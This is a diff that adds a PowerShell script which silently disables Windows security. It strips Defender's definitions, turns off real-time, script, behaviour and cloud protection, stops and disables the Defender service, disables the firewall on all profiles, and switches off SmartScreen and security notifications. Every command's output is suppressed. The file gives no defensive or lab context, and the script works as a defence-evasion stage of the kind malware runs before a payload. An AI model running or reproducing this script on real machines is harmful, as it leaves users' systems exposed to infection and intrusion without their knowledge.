@@ -1,0 +1,44 @@
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Type DWord -Value 1| Out-Null;
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1| Out-Null;
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force| Out-Null;
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1| Out-Null;
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance"| Out-Null;
+$propertyName = "Enabled"| Out-Null;
+$desiredValue = 0| Out-Null;
+if (-not (Test-Path $regPath)) {
+    New-Item -Path $regPath -Force | Out-Null
+}| Out-Null;
+Set-ItemProperty -Path $regPath -Name $propertyName -Value $desiredValue -Force| Out-Null;
+Set-NetFirewallProfile -Profile Domain,Private,Public -NotifyOnListen False| Out-Null;
+Set-MpPreference -UILockdown $true| Out-Null;
+cd "C:\Program Files\Windows Defender"| Out-Null;
+.\MpCmdRun.exe -removedefinitions -all| Out-Null;
+Remove-MpPreference| Out-Null;
+Set-MpPreference -DisableRealtimeMonitoring $true| Out-Null;
+Set-MpPreference -SubmitSamplesConsent 2| Out-Null;
+Set-MpPreference -DisableArchiveScanning $true| Out-Null;
+Set-MpPreference -DisableEmailScanning $true| Out-Null;
+Set-MpPreference -DisableScriptScanning $true| Out-Null;
+Set-MpPreference -DisableIntrusionPreventionSystem $true| Out-Null;
+Set-MpPreference -DisableIOAVProtection $true| Out-Null;
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False| Out-Null;
+Set-MpPreference -DisableBehaviorMonitoring $true| Out-Null;
+Set-MpPreference -DisableBlockAtFirstSeen $true| Out-Null;
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False| Out-Null;
+Set-NetFirewallProfile -Profile Public -Enabled False| Out-Null;
+Set-NetFirewallProfile -Profile Private -Enabled False| Out-Null;
+Set-NetFirewallProfile -Profile Domain -Enabled False| Out-Null;
+Set-MpPreference -MAPSReporting 0| Out-Null;
+Set-MpPreference -PUAProtection 0| Out-Null;
+Set-MpPreference -DisableCloudProtection $true| Out-Null;
+Stop-Service -Name WinDefend -Force| Out-Null;
+Set-Service -Name WinDefend -StartupType Disabled| Out-Null;
+$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"| Out-Null;
+$propertyName = "SmartScreenEnabled"| Out-Null;
+$desiredValue = "Off"| Out-Null;
+if (-not (Test-Path $regPath)) {
+    New-Item -Path $regPath -Force | Out-Null
+}| Out-Null;
+Set-ItemProperty -Path $regPath -Name $propertyName -Value $desiredValue -Force| Out-Null;
+echo "It worked!"
+
